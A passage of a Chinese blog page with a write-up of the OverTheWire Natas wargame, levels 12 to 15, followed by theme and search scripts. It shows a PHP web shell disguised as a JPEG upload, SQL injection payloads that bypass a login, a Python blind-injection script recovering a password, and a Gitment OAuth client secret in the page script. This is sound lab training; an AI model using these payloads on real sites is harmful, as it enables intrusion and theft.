+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fh = open(<span class="string">'shell.jpg'</span>,<span class="string">'w'</span>)</span><br><span class="line">fh.write(<span class="string">'\xFF\xD8\xFF\xE0'</span> + <span class="string">'&lt;? passthru($_GET["cmd"]); ?&gt;'</span>)</span><br><span class="line">fh.close()</span><br></pre></td></tr></table></figure>
+<p>然后用上一题同样的方法上传，获取密码</p>
+<p>Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 </p>
+<h2 id="Natas-Level-13-→-Level-14"><a href="#Natas-Level-13-→-Level-14" class="headerlink" title="Natas Level 13 → Level 14"></a>Natas Level 13 → Level 14</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Username: natas14</span><br><span class="line">URL:      http://natas14.natas.labs.overthewire.org</span><br><span class="line"></span><br><span class="line">密码：Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</span><br></pre></td></tr></table></figure>
+<p>过程：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">"username"</span>, $_REQUEST)) &#123;</span><br><span class="line">    $link = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'natas14'</span>, <span class="string">'&lt;censored&gt;'</span>);</span><br><span class="line">    mysql_select_db(<span class="string">'natas14'</span>, $link);</span><br><span class="line">    </span><br><span class="line">    $query = <span class="string">"SELECT * from users where username=\""</span>.$_REQUEST[<span class="string">"username"</span>].<span class="string">"\" and password=\""</span>.$_REQUEST[<span class="string">"password"</span>].<span class="string">"\""</span>;</span><br><span class="line">    <span class="keyword">if</span>(array_key_exists(<span class="string">"debug"</span>, $_GET)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Executing query: $query&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(mysql_num_rows(mysql_query($query, $link)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Access denied!&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close($link);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">"index.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">Username: &lt;input name=<span class="string">"username"</span>&gt;&lt;br&gt;</span><br><span class="line">Password: &lt;input name=<span class="string">"password"</span>&gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Login"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>注意的一个关键问题是，如果我们在GET请求中提供了一个’debug’参数，它将回显发送到数据库的确切查询。</p>
+<p>用户：username</p>
+<p>密码：password</p>
+<p>访问：<a href="http://natas14.natas.labs.overthewire.org/index.php?username=username&amp;%20password=password&amp;debug" target="_blank" rel="noopener">http://natas14.natas.labs.overthewire.org/index.php?username=username&amp;%20password=password&amp;debug</a></p>
+<p>返回：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Executing query: SELECT * from users where username=&quot;username&quot; and password=&quot;password&quot;</span><br><span class="line">Access denied!</span><br></pre></td></tr></table></figure>
+<p>用户：” or “1”=”1</p>
+<p>密码：password</p>
+<p>访问：</p>
+<p><a href="http://natas14.natas.labs.overthewire.org/index.php?username=%22%20or%20%221%22=%221&amp;%20password=password&amp;debug" target="_blank" rel="noopener">http://natas14.natas.labs.overthewire.org/index.php?username=%22%20or%20%221%22=%221&amp;%20password=password&amp;debug</a></p>
+<p>返回：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Executing query: SELECT * from users where username=&quot;&quot; or &quot;1&quot;=&quot;1&quot; and password=&quot;password&quot;</span><br><span class="line">Access denied!</span><br></pre></td></tr></table></figure>
+<p>用户：” or “1”=”1</p>
+<p>密码：” or “1”=”1</p>
+<p>访问：</p>
+<p><a href="http://natas14.natas.labs.overthewire.org/index.php?username=%22%20or%20%221%22=%221&amp;%20password=%22%20or%20%221%22=%221&amp;debug" target="_blank" rel="noopener">http://natas14.natas.labs.overthewire.org/index.php?username=%22%20or%20%221%22=%221&amp;%20password=%22%20or%20%221%22=%221&amp;debug</a></p>
+<p>返回：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Executing query: SELECT * from users where username=&quot;&quot; or &quot;1&quot;=&quot;1&quot; and password=&quot;&quot; or &quot;1&quot;=&quot;1&quot;</span><br><span class="line">Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</span><br></pre></td></tr></table></figure>
+<p>成功登陆并返回密码</p>
+<h2 id="Natas-Level-14-→-Level-15"><a href="#Natas-Level-14-→-Level-15" class="headerlink" title="Natas Level 14 → Level 15"></a>Natas Level 14 → Level 15</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Username: natas15</span><br><span class="line">URL:      http://natas15.natas.labs.overthewire.org</span><br><span class="line"></span><br><span class="line">密码：AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</span><br></pre></td></tr></table></figure>
+<p>过程：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">CREATE TABLE `users` (</span></span><br><span class="line"><span class="comment">  `username` varchar(64) DEFAULT NULL,</span></span><br><span class="line"><span class="comment">  `password` varchar(64) DEFAULT NULL</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">"username"</span>, $_REQUEST)) &#123;</span><br><span class="line">    $link = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'natas15'</span>, <span class="string">'&lt;censored&gt;'</span>);</span><br><span class="line">    mysql_select_db(<span class="string">'natas15'</span>, $link);</span><br><span class="line">    </span><br><span class="line">    $query = <span class="string">"SELECT * from users where username=\""</span>.$_REQUEST[<span class="string">"username"</span>].<span class="string">"\""</span>;</span><br><span class="line">    <span class="keyword">if</span>(array_key_exists(<span class="string">"debug"</span>, $_GET)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Executing query: $query&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $res = mysql_query($query, $link);</span><br><span class="line">    <span class="keyword">if</span>($res) &#123;</span><br><span class="line">    <span class="keyword">if</span>(mysql_num_rows($res) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"This user exists.&lt;br&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"This user doesn't exist.&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Error in query.&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close($link);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">"index.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">Username: &lt;input name=<span class="string">"username"</span>&gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Check existence"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>经过多次尝试后，这一题是sql盲注，并且存在natas16这个用户，而密码是32个字符，可以用这条查询语句来查寻密码中是否有<code>a</code>。</p>
+<p><code>Select * from username where username =“natas16”and password LIKE BINARY“%a%”</code></p>
+<p>所以用python写一个脚本来爆破出密码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span></span><br><span class="line">filtered = <span class="string">''</span></span><br><span class="line">passwd = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">    Data = &#123;<span class="string">'username'</span> : <span class="string">'natas16" and password LIKE BINARY "%'</span> + char + <span class="string">'%" #'</span>&#125;</span><br><span class="line">    r = requests.post(<span class="string">'http://natas15.natas.labs.overthewire.org/index.php?debug'</span>, auth=HTTPBasicAuth(<span class="string">'natas15'</span>, <span class="string">'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'</span>), data = Data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'exists'</span> <span class="keyword">in</span> r.text :</span><br><span class="line">        filtered = filtered + char</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> filtered:</span><br><span class="line">        Data = &#123;<span class="string">'username'</span> : <span class="string">'natas16" and password LIKE BINARY "'</span> + passwd + char + <span class="string">'%" #'</span>&#125;</span><br><span class="line">        r = requests.post(<span class="string">'http://natas15.natas.labs.overthewire.org/index.php?debug'</span>, auth=HTTPBasicAuth(<span class="string">'natas15'</span>, <span class="string">'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'</span>), data = Data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'exists'</span> <span class="keyword">in</span> r.text :</span><br><span class="line">            passwd = passwd + char</span><br><span class="line">            print(passwd)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>第一个循环是找出密码由哪些字符组成，而第二个双重循环的目的是查出密码，这样更快一点。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">W</span><br><span class="line">Wa</span><br><span class="line">WaI</span><br><span class="line">WaIH</span><br><span class="line">WaIHE</span><br><span class="line">WaIHEa</span><br><span class="line">WaIHEac</span><br><span class="line">WaIHEacj</span><br><span class="line">WaIHEacj6</span><br><span class="line">WaIHEacj63</span><br><span class="line">WaIHEacj63w</span><br><span class="line">WaIHEacj63wn</span><br><span class="line">WaIHEacj63wnN</span><br><span class="line">WaIHEacj63wnNI</span><br><span class="line">WaIHEacj63wnNIB</span><br><span class="line">WaIHEacj63wnNIBR</span><br><span class="line">WaIHEacj63wnNIBRO</span><br><span class="line">WaIHEacj63wnNIBROH</span><br><span class="line">WaIHEacj63wnNIBROHe</span><br><span class="line">WaIHEacj63wnNIBROHeq</span><br><span class="line">WaIHEacj63wnNIBROHeqi</span><br><span class="line">WaIHEacj63wnNIBROHeqi3</span><br><span class="line">WaIHEacj63wnNIBROHeqi3p</span><br><span class="line">WaIHEacj63wnNIBROHeqi3p9</span><br><span class="line">WaIHEacj63wnNIBROHeqi3p9t</span><br><span class="line">WaIHEacj63wnNIBROHeqi3p9t0</span><br><span class="line">WaIHEacj63wnNIBROHeqi3p9t0m</span><br><span class="line">WaIHEacj63wnNIBROHeqi3p9t0m5</span><br><span class="line">WaIHEacj63wnNIBROHeqi3p9t0m5n</span><br><span class="line">WaIHEacj63wnNIBROHeqi3p9t0m5nh</span><br><span class="line">WaIHEacj63wnNIBROHeqi3p9t0m5nhm</span><br><span class="line">WaIHEacj63wnNIBROHeqi3p9t0m5nhmh</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/Linux/" rel="tag"># Linux</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/26/bugku-web-writeup/" rel="next" title="bugku web writeup">
+                <i class="fa fa-chevron-left"></i> bugku web writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/05/21/extract变量覆盖/" rel="prev" title="extract变量覆盖">
+                extract变量覆盖 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      
+        <div id="gitment-container"></div>
+      
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      #
+	   	
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/uploads/avatar.png"
+                alt="Crayon-xin" />
+            
+              <p class="site-author-name" itemprop="name">Crayon-xin</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#NATAS0-33"><span class="nav-number">1.</span> <span class="nav-text">NATAS0-33</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Natas-Level-0"><span class="nav-number">2.</span> <span class="nav-text">Natas Level 0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Natas-Level-0-→-Level-1"><span class="nav-number">3.</span> <span class="nav-text">Natas Level 0 → Level 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Natas-Level-1-→-Level-2"><span class="nav-number">4.</span> <span class="nav-text">Natas Level 1 → Level 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Natas-Level-2-→-Level-3"><span class="nav-number">5.</span> <span class="nav-text">Natas Level 2 → Level 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Natas-Level-3-→-Level-4"><span class="nav-number">6.</span> <span class="nav-text">Natas Level 3 → Level 4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Natas-Level-4-→-Level-5"><span class="nav-number">7.</span> <span class="nav-text">Natas Level 4 → Level 5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Natas-Level-5-→-Level-6"><span class="nav-number">8.</span> <span class="nav-text">Natas Level 5 → Level 6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Natas-Level-6-→-Level-7"><span class="nav-number">9.</span> <span class="nav-text">Natas Level 6 → Level 7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Natas-Level-7-→-Level-8"><span class="nav-number">10.</span> <span class="nav-text">Natas Level 7 → Level 8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Natas-Level-8-→-Level-9"><span class="nav-number">11.</span> <span class="nav-text">Natas Level 8 → Level 9</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Natas-Level-9-→-Level-10"><span class="nav-number">12.</span> <span class="nav-text">Natas Level 9 → Level 10</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Natas-Level-10-→-Level-11"><span class="nav-number">13.</span> <span class="nav-text">Natas Level 10 → Level 11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Natas-Level-11-→-Level-12"><span class="nav-number">14.</span> <span class="nav-text">Natas Level 11 → Level 12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Natas-Level-12-→-Level-13"><span class="nav-number">15.</span> <span class="nav-text">Natas Level 12 → Level 13</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Natas-Level-13-→-Level-14"><span class="nav-number">16.</span> <span class="nav-text">Natas Level 13 → Level 14</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Natas-Level-14-→-Level-15"><span class="nav-number">17.</span> <span class="nav-text">Natas Level 14 → Level 15</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Crayon-xin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+<!-- LOCAL: You can save these files to your site and update links -->
+    
+        
+        <link rel="stylesheet" href="https://aimingoo.github.io/gitmint/style/default.css">
+        <script src="https://aimingoo.github.io/gitmint/dist/gitmint.browser.js"></script>
+    
+<!-- END LOCAL -->
+
+    
+      <style>
+        a.gitment-editor-footer-tip { display: none; }
+        .gitment-container.gitment-footer-container { display: none; }
+      </style>
+    
+
+    
+      <script type="text/javascript">
+      function renderGitment(){
+        var gitment = new Gitmint({
+            id: decodeURI(window.location.pathname), 
+            owner: 'crayon-xin',
+            repo: 'BlogGitment',
+            
+            lang: "" || navigator.language || navigator.systemLanguage || navigator.userLanguage,
+            
+            oauth: {
+            
+            
+                client_secret: '97b6db1162e8c3028f0368dcf5652150df48edc9',
+            
+                client_id: '371248f9e8d7899c092c'
+            }});
+        gitment.render('gitment-container');
+      }
+
+      
+      renderGitment();
+      
+      </script>
+    
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
